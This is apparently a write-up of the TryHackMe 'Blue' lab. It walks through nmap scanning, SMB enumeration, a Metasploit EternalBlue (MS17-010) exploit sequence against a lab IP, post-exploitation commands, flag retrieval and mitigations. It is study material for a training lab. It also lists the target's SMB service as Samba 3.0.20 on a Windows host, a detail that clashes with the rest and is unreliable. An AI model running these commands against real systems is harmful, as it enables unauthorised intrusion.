# Blue - TryHackMe

## Overview
Blue is a beginner-friendly room that focuses on Windows privilege escalation and EternalBlue exploitation.

## Reconnaissance
Let's start with a basic port scan to identify services.

```bash
nmap -sC -sV -oN nmap.txt 10.10.10.10
```

### Results:
- Port 135: RPC
- Port 139: NetBIOS
- Port 445: SMB
- Port 3389: RDP

## SMB Enumeration
Let's enumerate the SMB service for potential vulnerabilities.

```bash
smbclient -L //10.10.10.10 -N
enum4linux -a 10.10.10.10
```

### Findings:
- SMB version: Samba 3.0.20
- Anonymous access available
- Multiple shares discovered

## Vulnerability Assessment
The target appears to be vulnerable to MS17-010 (EternalBlue).

### Confirming Vulnerability:
```bash
nmap --script smb-vuln-ms17-010 10.10.10.10
```

## Exploitation
Using Metasploit to exploit the EternalBlue vulnerability.

### Metasploit Setup:
```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.10
set LHOST 10.10.14.5
exploit
```

### Manual Exploitation:
```bash
# Using EternalBlue exploit
python3 eternalblue.py 10.10.10.10
```

## Post-Exploitation
After gaining initial access, let's escalate privileges.

### System Information:
```cmd
systeminfo
whoami
net user
```

### Privilege Escalation:
```cmd
# Check for available exploits
background
use post/multi/recon/local_exploit_suggester
set session 1
run
```

## Root Access
Successfully gained SYSTEM privileges through the EternalBlue exploit.

### Final Steps:
```cmd
# Access user flag
type C:\Users\haris\Desktop\user.txt

# Access root flag
type C:\Users\Administrator\Desktop\root.txt
```

## Key Learnings
- SMB vulnerability exploitation
- EternalBlue attack methodology
- Windows privilege escalation
- Post-exploitation techniques
- Metasploit usage

## Tools Used
- Nmap
- Enum4linux
- Metasploit
- EternalBlue exploit
- Windows commands

## Mitigation
- Apply MS17-010 patch
- Disable SMBv1
- Implement network segmentation
- Regular security updates
- Network monitoring

---
*This room demonstrates the importance of keeping systems updated and patched against known vulnerabilities.*
